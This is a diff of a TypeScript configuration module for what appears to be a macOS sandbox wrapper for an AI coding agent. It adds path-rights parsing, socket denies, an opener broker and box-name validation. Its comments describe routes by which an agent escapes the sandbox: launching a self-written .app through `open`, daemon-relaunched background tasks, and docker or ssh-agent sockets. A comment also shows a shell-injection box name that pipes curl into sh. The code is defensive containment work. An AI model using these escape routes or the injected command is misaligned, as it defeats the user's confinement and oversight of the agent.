@@ -12,6 +12,17 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { pathToFileURL } from 'node:url';
+// `opener/aliases.ts` is a leaf (it imports nothing), so naming the generated
+// file from here costs no cycle — and keeps every opener path in one place.
+import { ALIASES_FILENAME } from '../opener/aliases.js';
+import {
+  BASE_PATH_GROUPS,
+  DEFAULT_DENY_WRITE_GLOBS,
+  type GrantTable,
+  PRIVATE_SYMLINK_ROOTS,
+  TMP_BASE_KEYS,
+} from '../policy/base.js';
+import { assertConfigTrusted, isInside, type TrustState } from './trust.js';
 
 export const HOME = os.homedir();
 
@@ -165,16 +176,149 @@ export interface NotifyConfig {
   bell?: boolean;
 }
 
-/** Extra rules layered on top of the built-in base profile. */
+/**
+ * The **opener broker** for a box: lets the agent ask you to reveal a folder in
+ * Finder or open a file in your editor, without granting the `open` escape
+ * ({@link Config.allowOpen}).
+ *
+ * The broker (`clabox opener`) runs OUTSIDE the sandbox and listens on a unix
+ * socket; the box reaches it with `clabox reveal <dir>` / `clabox open <file>`.
+ * Requests carry a path and nothing else — the application is whatever this
+ * config says, `reveal` compiles to `open -R` (which cannot launch anything),
+ * and every path must sit inside {@link OpenerConfig.roots}. See
+ * `src/opener/protocol.ts` for the reasoning behind each rule.
+ *
+ * Opt-in per box: no `opener` block, no socket grant in the profile.
+ */
+export interface OpenerConfig {
+  /** Master switch. A block with `enabled: false` grants nothing. */
+  enabled: boolean;
+  /**
+   * Application `edit` hands files to (`open -a <editor>`). null → `edit` is
+   * refused and only `reveal` works, which is the safest useful setting: Finder
+   * never executes what it reveals, while an editor may execute what it opens
+   * (Obsidian runs vault plugins and dataviewjs; VS Code has tasks).
+   */
+  editor?: string | null;
+  /**
+   * Directories requests may point into. `~` is expanded; a relative entry is
+   * resolved against the box's project dir. Default: the project dir alone —
+   * i.e. the agent can only ask you to look at the thing it's working on.
+   */
+  roots?: string[];
+  /** Extensions `edit` accepts. Default: `DEFAULT_EDIT_EXTENSIONS`. */
+  extensions?: string[];
+  /** Max requests per minute before the broker starts refusing. Default 12. */
+  maxPerMinute?: number;
+}
+
+/**
+ * The rights one path can carry, as a compact flag set — `'rw'`, `['r', 'w']`,
+ * or the spelled-out `['read', 'write']`:
+ *
+ *   - `r` — **read**: contents + metadata + xattrs (`file-read*`).
+ *   - `w` — **write**: `file-write*`, and read with it (a writable path is
+ *     readable; the profile emits `file-read* file-write*`).
+ *   - `s` — **stat** only: existence, size, mode, mtime. No contents, and a
+ *     directory can't be listed. The narrowest class, and implied by `r`/`w`
+ *     (SBPL's `file-read*` already covers `file-read-metadata`).
+ *   - `e` — **exec** (`process-exec`). Orthogonal to the three read classes: a
+ *     hook script needs `'re'`, a bin dir usually `'re'` too.
+ *   - `c` — **connect** to the unix socket at this path (`network-outbound` with
+ *     a path filter). Also orthogonal: a socket `connect(2)` is not a file
+ *     operation, so no amount of `r`/`w` grants it and no file deny takes it
+ *     away. Unix sockets are denied by default — this is how a box opts into one
+ *     (`/var/run/docker.sock`, an ssh-agent, a database socket).
+ *   - `d` — **deny** read + write + stat + connect. Exclusive: `'rd'` is a
+ *     contradiction and throws rather than silently picking a winner.
+ *
+ * Narrowest first, each wider class implies the ones below it, so a path only
+ * ever needs its widest class: `'w'` ≡ `'rw'` ≡ `'rsw'`.
+ */
+export type PathGrant = string | string[];
+
+/** Keys of {@link PathRules} that are rule *lists*, not paths. */
+const PATH_RULE_FIELDS = [
+  'readWrite',
+  'readOnly',
+  'read',
+  'write',
+  'stat',
+  'exec',
+  'socket',
+  'deny',
+  'denyGlobs',
+  'denyWriteGlobs',
+] as const;
+
+export {
+  BASE_PATH_GROUPS,
+  type BasePathGroup,
+  DEFAULT_DENY_WRITE_GLOBS,
+  FLAG_FETCH_BLOCKERS,
+  type GrantTable,
+  PRIVATE_SYMLINK_ROOTS,
+  SANDBOX_ESCAPE_GUARDS,
+  TMP_BASE_KEYS,
+} from '../policy/base.js';
+
+/**
+ * Extra rules layered on top of the built-in base profile. Two spellings, freely
+ * mixed in the same object, both resolved by {@link resolvedPathRules}:
+ *
+ * **Per path** (preferred) — the key is the path, the value its rights:
+ *
+ *     paths: {
+ *       '~/scratch': 'w',                  // read + write
+ *       '~/some/hooks': ['r', 'e'],        // read + exec, so a hook can run
+ *       '~/Library/Group Containers': 's', // stat only: it exists, nothing more
+ *       '~/secret-project': 'd',           // denied outright
+ *     }
+ *
+ * This is the shape that survives a config merge intact: `paths` is deep-merged,
+ * so a box adding `'~/x': 'r'` keeps every path its preset declared — whereas the
+ * list form below *replaces* the preset's array (arrays replace on merge), which
+ * is why presets have to be spread by hand.
+ *
+ * **Per class** (the original spelling, still supported) — one list per right:
+ * `read`/`write`/`stat`/`exec`/`deny`, plus the older aliases `readOnly` =
+ * `read` and `readWrite` = `write`.
+ */
 export interface PathRules {
-  /** RW subpaths (beyond project dir + configDir + /tmp). */
-  readWrite: string[];
-  /** RO subpaths. */
-  readOnly: string[];
+  /** RW subpaths (beyond project dir + configDir + /tmp). Alias of {@link PathRules.write}. */
+  readWrite?: string[];
+  /** RO subpaths. Alias of {@link PathRules.read}. */
+  readOnly?: string[];
+  /** RO subpaths (canonical name; concatenated with {@link PathRules.readOnly}). */
+  read?: string[];
+  /** RW subpaths (canonical name; concatenated with {@link PathRules.readWrite}). */
+  write?: string[];
+  /**
+   * **stat-only** subpaths: `file-read-metadata` and nothing else.
+   *
+   * The profile does NOT grant metadata globally (see `profile.ts`), so by
+   * default a box can only `stat` what it can also read or write. This re-opens
+   * `stat` — and strictly `stat` — for a path whose *existence* a tool needs
+   * while its contents stay denied. The hard secret deny is still emitted after
+   * it, so this cannot uncover `~/.ssh/id_*`.
+   */
+  stat?: string[];
   /** process-exec subpaths (e.g. a hook-scripts dir so `config.hooks` can run). */
-  exec: string[];
-  /** explicit deny subpaths (read + write). */
-  deny: string[];
+  exec?: string[];
+  /**
+   * Unix-socket paths the box may `connect(2)` to — `network-outbound` with a
+   * path filter, **not** a file grant.
+   *
+   * Sockets are denied by default: a socket connect is authorized as networking,
+   * so the blanket `(allow network*)` the profile used to emit handed the box
+   * every unix socket on the machine regardless of the file denies — including
+   * 1Password's ssh-agent (sign as you) and `/var/run/docker.sock` (root on the
+   * host, outside every box). Now the profile grants IP only, and a socket has to
+   * be named here (or with the per-path `'c'` right).
+   */
+  socket?: string[];
+  /** explicit deny subpaths (read + write + stat + socket connect). */
+  deny?: string[];
   /**
    * gitignore-style globs whose matches are denied **read**, at any depth
    * *inside the project workspace* (kept off system dirs on purpose — a global
@@ -184,7 +328,57 @@ export interface PathRules {
    * non-slash char; a directory match also covers its contents. Compiled to
    * SBPL regex by `globToRegexBody` — the patterns live here as data.
    */
-  denyGlobs: string[];
+  denyGlobs?: string[];
+  /**
+   * gitignore-style globs whose matches are denied **write** inside the project
+   * workspace — read stays untouched. Same compiler and same `!`-re-allow
+   * semantics as {@link PathRules.denyGlobs}.
+   *
+   * Unlike `denyGlobs` this one ships a **non-empty default**
+   * ({@link DEFAULT_DENY_WRITE_GLOBS}), because the project dir is the one tree
+   * the agent writes freely and a handful of files in it are executed *outside*
+   * the sandbox by someone else later. See that constant for the list and the
+   * reasoning.
+   */
+  denyWriteGlobs?: string[];
+  /** `'<path>': '<rights>'` — see {@link PathGrant} and the interface docs. */
+  [path: string]: PathGrant | undefined;
+}
+
+/**
+ * The resolved twin of a path under one of {@link PRIVATE_SYMLINK_ROOTS}, or
+ * null when the path needs no twin (already resolved, a regex, `~`-relative, or
+ * one of the roots itself — a root is the symlink, so it is granted as itself).
+ * Lexical on purpose: it must give the same answer inside a box, where the path
+ * it's talking about may be unreadable, as it does on a bare host.
+ */
+export function resolvedTwin(p: string): string | null {
+  if (p.startsWith('^') || p.startsWith('~') || p.startsWith('/private/')) return null;
+  const root = PRIVATE_SYMLINK_ROOTS.find((r) => p.startsWith(`${r}/`));
+  return root ? `/private${p}` : null;
+}
+
+/** Every built-in grant flattened — the seed for `defaultConfig.paths`. */
+export function basePaths(): GrantTable {
+  return Object.assign({}, ...BASE_PATH_GROUPS.map((g) => g.paths));
+}
+
+/**
+ * The base-policy keys a config left **untouched** — those are emitted by the
+ * profile's own base sections, so the box's grant list must skip them.
+ *
+ * A key whose rights differ from the default is a deliberate override, and it is
+ * NOT skipped: it's emitted with the box's other grants, i.e. *after* the soft
+ * privacy deny, where (last match wins) it can widen a default — `'/': 'w'` for a
+ * whole-disk box — or `'d'` can take one away.
+ */
+export function untouchedBaseKeys(paths: PathRules): Set<string> {
+  const base = basePaths();
+  const out = new Set<string>();
+  for (const [key, rights] of Object.entries(base)) {
+    if ((paths as Record<string, unknown>)[key] === rights) out.add(key);
+  }
+  return out;
 }
 
 /** Effective clabox configuration. */
@@ -276,6 +470,49 @@ export interface Config {
    * box env. Flip it only for a box you'd be happy to run unsandboxed.
    */
   allowBackgroundTasks: boolean;
+  /**
+   * Let the box use **Launch Services** — `/usr/bin/open` and the `lsd` /
+   * `launchservicesd` mach services (`false` by default).
+   *
+   * This is a sandbox **escape hatch**, in the same class as
+   * {@link Config.allowBackgroundTasks} and for the same reason: the work is
+   * done by a process the box didn't fork. `open` hands a path to
+   * LaunchServices, which lives outside every box and starts the target as a
+   * fresh process under **launchd (PPID 1) with no Seatbelt profile**. Since the
+   * box can write `.app` bundles into `/tmp`, `$TMPDIR` or the project dir, a
+   * granted `lsopen` is arbitrary unsandboxed code execution as the user, always
+   * available and needing no running daemon:
+   *
+   *     mkdir -p /tmp/Esc.app/Contents/MacOS && … && open /tmp/Esc.app
+   *     → runs with ppid 1, writes $HOME — paths the box itself cannot touch
+   *
+   * The profile already withholds `appleevent-send` for exactly this reason
+   * (scripting your terminal would be an escape); `lsopen` was the same hole by
+   * another name. Flip it on only for a box you'd be happy to run unsandboxed —
+   * e.g. one whose whole point is opening URLs in your browser.
+   */
+  allowOpen: boolean;
+  /**
+   * Grant the box claude's daemon socket dir (`/tmp/cc-daemon-<uid>`), which
+   * Remote Control (`/rc`) and `--bg-pty-host` talk over. `false` by default;
+   * the `--rc` CLI flag turns it on for that launch, and
+   * {@link Config.allowBackgroundTasks} implies it.
+   *
+   * Not an escape by itself — the escape is the unsandboxed daemon re-hosting
+   * the session, which {@link SANDBOX_ESCAPE_GUARDS} closes in the env. But that
+   * guard is *cooperative* (an env var inside a process the agent controls),
+   * and a box that never uses `/rc` has no reason to keep the channel to the
+   * one daemon that can re-launch it without a profile. So the socket follows
+   * the feature: no `/rc`, no socket.
+   */
+  remoteControl: boolean;
+  /**
+   * Opt-in opener broker — the safe slice of `open` (reveal a folder, open a
+   * file in your editor) without granting {@link Config.allowOpen}. See
+   * {@link OpenerConfig}; absent → nothing is granted and `clabox open` in-box
+   * has nowhere to connect.
+   */
+  opener?: OpenerConfig;
   /** Cap the process table inside the sandbox (fork-bomb guard). 0 → skip. */
   ulimitProcs: number;
   paths: PathRules;
@@ -333,16 +570,39 @@ export const defaultConfig: Config = {
   // Background tasks escape the sandbox (they're launched by the unsandboxed
   // daemon, not forked in-box) — off unless a box explicitly opts in.
   allowBackgroundTasks: env.CLABOX_ALLOW_BACKGROUND_TASKS === '1',
+  // `open` escapes the sandbox too: LaunchServices starts the target under
+  // launchd with no profile, and the box can write the `.app` it opens.
+  allowOpen: env.CLABOX_ALLOW_OPEN === '1',
+  // The daemon socket follows the feature that needs it (`--rc` turns it on).
+  remoteControl: env.CLABOX_REMOTE_CONTROL === '1',
   ulimitProcs: 1024,
   paths: {
     readWrite: [],
     readOnly: [],
+    read: [],
+    write: [],
+    // stat is NOT granted globally by the profile — a box can only stat what it
+    // can read/write. Empty by default; list a path here to re-open bare
+    // `stat(2)` on it without exposing its contents.
+    stat: [],
+    // Unix sockets are denied by default; name one here (or give a path the `c`
+    // right) to let the box connect to it.
+    socket: [],
     exec: [],
     deny: [],
     // gitignore-style read-deny inside the project (opt-in, empty by default).
     // e.g. ['**/.env*', '!**/.env.example', '**/___*'] to hide `.env*` secrets
     // + `___*` files (triple `_` dodges Python dunders like `__init__.py`).
     denyGlobs: [],
+    // …and the write-deny counterpart, which DOES ship a default: the few files
+    // in a checkout that are executed outside the sandbox later on (clabox's own
+    // config, `.git/config`, `.git/hooks`, `.envrc`). See the constant.
+    denyWriteGlobs: [...DEFAULT_DENY_WRITE_GLOBS],
+    // …and the built-in base policy (BASE_PATH_GROUPS above), as ordinary
+    // `path: rights` entries. They're part of the config on purpose: a box can
+    // narrow one (`'/System': 'r'`), take it away (`'~/Library/Keychains': 'd'`)
+    // or add to it, and each keeps its position in the generated profile.
+    ...basePaths(),
   },
   denyHome: ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Movies', 'Music'],
   // `.config/git` is always carved back out for git RO config in the profile.
@@ -409,75 +669,196 @@ export function mergeConfig(base: Config, override: unknown): Config {
 }
 
 /**
- * Append extra path grants (e.g. from the `--ro`/`--rw` CLI flags) onto a
- * config's `paths`. Unlike a config-file merge — where arrays *replace* — these
- * are **additive**: they concatenate onto `config.paths.readOnly`/`readWrite`,
- * so an ad-hoc CLI grant never wipes out a box's own paths. Returns the same
- * config unchanged when nothing extra is supplied.
+ * The three access classes as the profile builder wants them: the canonical
+ * `read`/`write`/`stat` names with the legacy `readOnly`/`readWrite` aliases
+ * folded in (concatenated, aliases first), plus the untouched `exec`/`deny`/
+ * `denyGlobs`. Pure, so `buildProfile` never has to care which spelling a box
+ * used.
+ */
+export interface ResolvedPathRules {
+  read: string[];
+  write: string[];
+  stat: string[];
+  exec: string[];
+  socket: string[];
+  deny: string[];
+  denyGlobs: string[];
+  denyWriteGlobs: string[];
+  /**
+   * The box's grants as one `path: rights` table — the per-class lists above
+   * folded together with the per-path entries, so the profile compiles them with
+   * the same `grantBlock` it uses for the base policy. A path named in two
+   * classes gets both letters (`stat` + `write` ⇒ `'sw'`, i.e. writable), which is
+   * what "the widest class wins" means once the lists are gone. `deny` is NOT in
+   * here: it belongs to the soft deny tier, which is emitted earlier.
+   */
+  table: GrantTable;
+}
+
+/** Long spellings accepted in a {@link PathGrant} alongside the single letters. */
+const RIGHT_WORDS: Record<string, string> = {
+  read: 'r',
+  write: 'w',
+  exec: 'e',
+  stat: 's',
+  socket: 'c',
+  connect: 'c',
+  deny: 'd',
+  ro: 'r',
+  rw: 'rw',
+};
+
+/**
+ * Normalize one {@link PathGrant} to a set of right letters.
+ *
+ * Accepts `'rw'`, `['r', 'w']` and `['read', 'write']` — a list entry is first
+ * looked up as a whole word, then split into letters, so `['rw', 'e']` works too.
+ * Throws on an unknown letter, on an empty grant, and on `d` mixed with a grant:
+ * a config typo must not quietly become a *wider* sandbox than intended.
+ *
+ * @param path only used for the error messages.
+ */
+export function parsePathGrant(grant: PathGrant, path = '<path>'): Set<string> {
+  const chunks = Array.isArray(grant) ? grant : [grant];
+  const out = new Set<string>();
+  for (const chunk of chunks) {
+    const token = String(chunk).trim().toLowerCase();
+    if (!token) continue;
+    for (const letter of RIGHT_WORDS[token] ?? token) {
+      if (!'rwescdlmi'.includes(letter)) {
+        throw new Error(
+          `clabox: unknown right '${letter}' for path '${path}' — use r (read), w (write), s (stat), e (exec), c (socket connect), d (deny), or the m/i/l modifiers`,
+        );
+      }
+      out.add(letter);
+    }
+  }
+  if (!out.size) {
+    throw new Error(
+      `clabox: empty rights for path '${path}' — say 'd' to deny it, or drop the entry`,
+    );
+  }
+  if (out.has('d') && out.size > 1) {
+    throw new Error(
+      `clabox: contradictory rights '${[...out].join('')}' for path '${path}' — 'd' (deny) cannot be combined with a grant`,
+    );
+  }
+  return out;
+}
+
+/**
+ * Fold both spellings of {@link PathRules} into one list per right: the legacy
+ * `readOnly`/`readWrite` aliases into `read`/`write`, and every `'<path>':
+ * '<rights>'` entry into the class its letters name. Per-class lists come first,
+ * then the per-path entries in declaration order — within a class the order only
+ * matters for readability, since the profile emits whole classes in a fixed
+ * order (stat → read → write).
+ *
+ * Any key that is neither a known field nor path-shaped (`/`, `~`, `.`) throws,
+ * so `readWritte: [...]` is caught as the typo it is instead of being taken for
+ * a relative path and silently ignored.
+ */
+export function resolvedPathRules(
+  paths: PathRules,
+  skip: Set<string> = new Set(),
+): ResolvedPathRules {
+  const out: ResolvedPathRules = {
+    read: [...(paths.readOnly ?? []), ...(paths.read ?? [])],
+    write: [...(paths.readWrite ?? []), ...(paths.write ?? [])],
+    stat: [...(paths.stat ?? [])],
+    exec: [...(paths.exec ?? [])],
+    socket: [...(paths.socket ?? [])],
+    deny: [...(paths.deny ?? [])],
+    denyGlobs: [...(paths.denyGlobs ?? [])],
+    denyWriteGlobs: [...(paths.denyWriteGlobs ?? [])],
+    table: {},
+  };
+  const byLetter: Record<string, string[]> = {
+    r: out.read,
+    w: out.write,
+    s: out.stat,
+    e: out.exec,
+    c: out.socket,
+    d: out.deny,
+  };
+  /** Letters that are matcher modifiers / niche ops, kept only in `table`. */
+  const extraLetters = new Map<string, string>();
+  for (const [key, value] of Object.entries(paths)) {
+    if ((PATH_RULE_FIELDS as readonly string[]).includes(key)) continue;
+    if (value === undefined) continue;
+    // Paths the caller handles elsewhere — the base-policy keys, which the
+    // profile emits in their own sections (in order) rather than lumped in with
+    // the box's own grants.
+    if (skip.has(key)) continue;
+    // A path (`/`, `~`, `.`) or an SBPL regex (`^…`). Anything else is a typo —
+    // `readWritte: [...]` must not be mistaken for a relative path.
+    if (!/^[/~.^]/.test(key)) {
+      throw new Error(
+        `clabox: unknown paths key '${key}' — expected a path (starting with /, ~ or .), a regex (^…) or one of ${PATH_RULE_FIELDS.join(', ')}`,
+      );
+    }
+    const letters = parsePathGrant(value, key);
+    for (const letter of letters) byLetter[letter]?.push(key);
+    // `l` (literal), `m` (map-executable) and `i` (ioctl) have no class list —
+    // they survive only through `table`.
+    const kept = [...letters].filter((x) => 'lmi'.includes(x)).join('');
+    if (kept) extraLetters.set(key, kept);
+  }
+  // De-duplicate *within* a class (first mention wins the position): a path named
+  // by both spellings, or by a preset and the box, is one rule. Across classes it
+  // is left alone — `'re'` belongs in both `read` and `exec`. `denyGlobs` keeps
+  // its exact order and repeats: there, last match wins and `!` re-allows.
+  for (const key of ['read', 'write', 'stat', 'exec', 'socket', 'deny'] as const) {
+    out[key] = [...new Set(out[key])];
+  }
+  // Fold every class back into one table, narrowest first so the letters read in
+  // a stable order. A path in two classes ends up with both letters.
+  const table: GrantTable = {};
+  const addLetter = (p: string, letter: string) => {
+    const cur = table[p] ?? '';
+    if (!cur.includes(letter)) table[p] = cur + letter;
+  };
+  for (const [letter, list] of [
+    ['s', out.stat],
+    ['r', out.read],
+    ['w', out.write],
+    ['e', out.exec],
+    ['c', out.socket],
+  ] as Array<[string, string[]]>) {
+    for (const p of list) addLetter(p, letter);
+  }
+  for (const [p, letters] of extraLetters) for (const l of letters) addLetter(p, l);
+  out.table = table;
+  return out;
+}
+
+/**
+ * Append extra path grants (e.g. from the `--ro`/`--rw`/`--stat` CLI flags) onto
+ * a config's `paths`. Unlike a config-file merge — where arrays *replace* —
+ * these are **additive**: they concatenate onto `config.paths.readOnly` /
+ * `readWrite` / `stat`, so an ad-hoc CLI grant never wipes out a box's own
+ * paths. Returns the same config unchanged when nothing extra is supplied.
  */
 export function withExtraPaths(
   config: Config,
-  extra: { readOnly?: string[]; readWrite?: string[] } = {},
+  extra: { readOnly?: string[]; readWrite?: string[]; stat?: string[]; socket?: string[] } = {},
 ): Config {
   const readOnly = extra.readOnly ?? [];
   const readWrite = extra.readWrite ?? [];
-  if (!readOnly.length && !readWrite.length) return config;
+  const stat = extra.stat ?? [];
+  const socket = extra.socket ?? [];
+  if (!readOnly.length && !readWrite.length && !stat.length && !socket.length) return config;
   return {
     ...config,
     paths: {
       ...config.paths,
-      readOnly: [...config.paths.readOnly, ...readOnly],
-      readWrite: [...config.paths.readWrite, ...readWrite],
+      readOnly: [...(config.paths.readOnly ?? []), ...readOnly],
+      readWrite: [...(config.paths.readWrite ?? []), ...readWrite],
+      stat: [...(config.paths.stat ?? []), ...stat],
+      socket: [...(config.paths.socket ?? []), ...socket],
     },
   };
 }
-
-/**
- * The env vars that turn claude's **feature-flag fetching** off. Any one of them,
- * from any source (the box `env`, the login shell, a `settings.json` `env`
- * block), is enough — and with fetching off the flag-gated features fall back to
- * their code defaults, which hides Remote Control (`/rc`), auto mode by default,
- * cross-machine session messaging, `/import`, `/skill-doctor` and more:
- * https://code.claude.com/docs/en/env-vars#features-that-need-feature-flag-fetching
- *
- * The first two count **any non-empty value** (`0` and `false` included), so
- * they can only be neutralized by *unsetting* them — which is what the `--rc`
- * CLI flag does (it maps to `withExtraEnv(config, FLAG_FETCH_BLOCKERS)`).
- */
-/**
- * Env vars the launcher forces into every box that hasn't set
- * {@link Config.allowBackgroundTasks} — the vars that close claude's
- * **background-task escape hatch**.
- *
- * Why it's an escape and not just a feature: a background task is not forked by
- * the sandboxed claude (a macOS sandbox is inherited and can't be dropped, so a
- * real fork would stay confined). The in-box process asks the singleton
- * `claude daemon run` supervisor over its control socket, and that daemon runs
- * **outside every box** — PPID 1, started by launchd, no `sandbox-exec` anywhere
- * in its ancestry. It answers by launching `claude --fork-session --resume
- * <same-session-id>`, so the work continues with the identical transcript and an
- * empty Seatbelt policy. Observed ancestry of such a session:
- *
- *     zsh ← claude --fork-session --resume ← ClaudeCode.app --bg-pty-host
- *         ← claude daemon run   (PPID 1, launchd)
- *
- * It reads `~/Library/Logs/DiagnosticReports`, writes `~/Desktop`, and still
- * carries the box's "you're in a sandbox" system prompt. Only the keychain-level
- * hard denies survive, because they're macOS ACLs rather than profile rules.
- *
- * Emitted **before** `config.env` so a box (or `-e KEY=VALUE`) can still
- * override them — the guard is a default, not a lock.
- */
-export const SANDBOX_ESCAPE_GUARDS: Record<string, string> = {
-  CLAUDE_CODE_DISABLE_BACKGROUND_TASKS: '1',
-};
-
-export const FLAG_FETCH_BLOCKERS = [
-  'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC',
-  'DISABLE_TELEMETRY',
-  'DO_NOT_TRACK',
-  'DISABLE_GROWTHBOOK',
-];
 
 /**
  * Layer ad-hoc env overrides (from the repeatable `--env`/`-e` CLI flag) onto
@@ -507,6 +888,10 @@ export function withExtraEnv(config: Config, entries: string[] = []): Config {
 /**
  * Locate a config file: explicit (CLI arg, then `CLABOX_CONFIG` env),
  * then CWD, then ~/.config. The CLI arg wins over the env var.
+ *
+ * The CWD candidate is why {@link loadConfig} runs a trust check: in a repo a
+ * box has been working in, `./clabox.config.mjs` is an agent-writable file that
+ * a bare `clabox` would otherwise execute, unsandboxed, on the next launch.
  */
 export function findConfigFile(explicit?: string | null): string | null {
   const chosen = explicit ?? env.CLABOX_CONFIG;
@@ -548,7 +933,134 @@ export function claboxSettingsDir(): string {
   return path.join(claboxHomeDir(), 'settings');
 }
 
+/**
+ * `<claboxHome>/opener` — everything the opener broker owns, in one directory:
+ * its socket, its pid file and its log. One dir rather than a socket under
+ * `run/` and a log at the clabox-home root, so "what does the broker have on
+ * disk" is answered by `ls`.
+ *
+ * Under the clabox home rather than `$TMPDIR` on purpose: `$TMPDIR` is granted
+ * read-write to *every* box, so a socket there could be driven by any box (and
+ * by any other process of yours), whereas the clabox home is read-only in-box
+ * and reaching the socket at all takes an explicit per-box grant. Connecting
+ * needs no write access — a unix-socket `connect(2)` is `network-outbound` with
+ * a path filter, not a file write. The log is written by the broker, which runs
+ * *outside* every box, so read-only in-box costs it nothing either.
+ */
+export function openerDir(): string {
+  return path.join(claboxHomeDir(), 'opener');
+}
+
+/** The socket the opener broker listens on: `<claboxHome>/opener/opener-<uid>.sock`. */
+export function openerSocketPath(): string {
+  // ONE socket for the machine, not one per box. The broker is a convenience
+  // the user runs for themselves, and every box talks to the same one — a box
+  // only ever sends a path, and the answer (a Finder window, an editor tab)
+  // goes to the user, never back to the box.
+  return path.join(openerDir(), `opener-${process.getuid?.() ?? 0}.sock`);
+}
+
+/**
+ * `<claboxHome>/opener/opener-<uid>.pid` — the broker's pid file, next to its
+ * socket. The broker is a singleton (one socket per uid), so a second
+ * `clabox opener` has to *find* the first rather than quietly unlink its socket
+ * and leave it running with nothing to serve.
+ */
+export function openerPidPath(): string {
+  return openerSocketPath().replace(/\.sock$/, '.pid');
+}
+
+/**
+ * `<claboxHome>/opener/opener.log` — one line per request, allowed or not.
+ *
+ * Derived from {@link openerDir}, not from the socket path: it used to be
+ * `dirname(dirname(socket))`, which silently followed the socket up two levels
+ * and would land somewhere else the moment the layout changed.
+ */
+export function openerLogPath(): string {
+  return path.join(openerDir(), 'opener.log');
+}
+
+/**
+ * `<claboxHome>/opener/claude-aliases.sh` — the source-able shell helpers
+ * (`o`, `c`, `ob`) the broker generates for itself, beside its socket and log.
+ *
+ * In the clabox home rather than somewhere in the user's dotfiles because a box
+ * has to be able to **read** it: the helpers are what the agent types inside the
+ * box, and the post-deny carve-out already grants that tree read-only.
+ */
+export function openerAliasesPath(): string {
+  return path.join(openerDir(), ALIASES_FILENAME);
+}
+
+/**
+ * The opener policy: which directories may be shown and with what editor.
+ *
+ * Deliberately NOT per box. A box only ever sends a path; the result (a Finder
+ * window, an editor tab) lands in front of the **user**, never back in the box.
+ * So there is one broker for the machine, its policy comes from wherever it was
+ * started (the global config, or `--root`/`--editor` flags), and every box
+ * talks to the same socket.
+ *
+ * A box can still opt out with `opener: { enabled: false }` — then the profile
+ * grants it no socket at all. Default: enabled, roots `[$HOME]`, no editor
+ * (which means `open -t`, the system text editor).
+ */
+export function resolvedOpener(config: Config): {
+  roots: string[];
+  editor: string | null;
+  extensions?: string[];
+  maxPerMinute?: number;
+} | null {
+  const o = config.opener;
+  if (o?.enabled === false) return null;
+  const roots = (o?.roots?.length ? o.roots : [HOME]).map((r) => path.resolve(expandHome(r)));
+  return {
+    roots,
+    editor: o?.editor ?? null,
+    extensions: o?.extensions,
+    maxPerMinute: o?.maxPerMinute,
+  };
+}
+
+/**
+ * `<claboxHome>/bin` — de-privileged copies of system tools the sandbox can't
+ * exec in their original form (see `sandbox/proctools.ts`). Prepended to the
+ * box's PATH. Lives under the clabox home because that dir already carries the
+ * post-deny read + `process-exec` carve-out, so nothing new opens in the
+ * profile.
+ */
+export function claboxBinDir(): string {
+  return path.join(claboxHomeDir(), 'bin');
+}
+
 const BOX_SUFFIXES = ['.config.mjs', '.mjs'];
+
+/**
+ * What a box name may contain. Box names are **filenames that become code**:
+ * `init` interpolates them into a generated `clabox-<name>()` shell function and
+ * into the `zsh -lic '… -b <name>'` command baked into a Ghostty app, and `tab`
+ * puts them in an AppleScript surface command. A name is attacker-chosen as soon
+ * as box configs come from a repo (see utils/trust.ts), so `x; curl e|sh; #.mjs`
+ * must never reach a generator. Letters, digits, `.`/`_`/`-`, first char
+ * alphanumeric — anything else is not a box.
+ */
+const BOX_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;
+
+/** True when `name` is safe to interpolate into a generated command. */
+export function isSafeBoxName(name: string): boolean {
+  return BOX_NAME_RE.test(name);
+}
+
+/** {@link isSafeBoxName} as a guard; returns the name so it can be chained. */
+export function assertSafeBoxName(name: string): string {
+  if (!isSafeBoxName(name)) {
+    throw new Error(
+      `clabox: unsafe box name '${name}' — only letters, digits, '.', '_' and '-' are allowed (a box name ends up inside generated shell commands)`,
+    );
+  }
+  return name;
+}
 
 /** Candidate file paths for a box name, in resolution order. */
 function boxCandidates(name: string, dir: string): string[] {
@@ -577,7 +1089,12 @@ export function listBoxes(dir: string = configsDir()): string[] {
     // `_`-prefixed files are shared partials (e.g. `_presets.mjs`), not boxes.
     if (f.startsWith('_')) continue;
     const suffix = BOX_SUFFIXES.find((s) => f.endsWith(s));
-    if (suffix) names.add(f.slice(0, -suffix.length));
+    if (!suffix) continue;
+    const name = f.slice(0, -suffix.length);
+    // A filename that isn't a usable box name is skipped rather than listed:
+    // `-b` would refuse it anyway, and `init` would otherwise interpolate it
+    // into a shell function and a Ghostty `command` (see BOX_NAME_RE).
+    if (isSafeBoxName(name)) names.add(name);
   }
   return [...names].sort();
 }
@@ -609,7 +1126,10 @@ export function resolveBox(ref: string, dir: string = configsDir()): string {
   }
   // `_`-prefixed files are shared partials (e.g. `_presets.mjs`), not boxes —
   // keep them un-resolvable so `-b` matches what `listBoxes` advertises.
+  // The charset check is the same one `listBoxes` filters on: a name that would
+  // be unsafe to interpolate into a generated command is not a box.
   if (!ref.startsWith('_')) {
+    assertSafeBoxName(ref);
     const found = boxCandidates(ref, dir).find((c) => isFile(c));
     if (found) return found;
   }
@@ -622,22 +1142,169 @@ export function resolveBox(ref: string, dir: string = configsDir()): string {
 export interface LoadedConfig {
   config: Config;
   configFile: string | null;
+  /** How the config file passed the trust gate (null → built-in defaults). */
+  trust: TrustState | 'accepted' | null;
+}
+
+/**
+ * Effective project dir for a config: `config.cwd` (`~`-expanded, absolute) or
+ * the shell's CWD. `sandbox/run.ts#resolveProjectDir` is the public name for
+ * this; it lives here too so the config layer can reason about the project dir
+ * (which paths a box can write) without importing the launcher.
+ */
+export function projectDirOf(config: Config): string {
+  return config.cwd ? path.resolve(expandHome(config.cwd)) : process.cwd();
+}
+
+/**
+ * True when `p` is buried by the **hard secret deny** — the `~/.<denyDotConfigs>`
+ * tier the profile emits *after* every allow, so it wins however wide the box's
+ * grants are.
+ *
+ * Load-bearing for the box-writable check: a whole-disk box (`paths: {'/': 'w'}`)
+ * lists `/` as writable, and "is the config inside `/`?" is true for every
+ * config on the machine — including the ones under `~/.config/clabox`, which
+ * that same profile then takes back (read-only carve-out). Without this, such a
+ * box refuses to start with "the agent could edit its own policy", which is
+ * exactly backwards: that config is the one place it *cannot* write.
+ *
+ * Judged on the resolved path (`isInside` realpaths both sides), matching
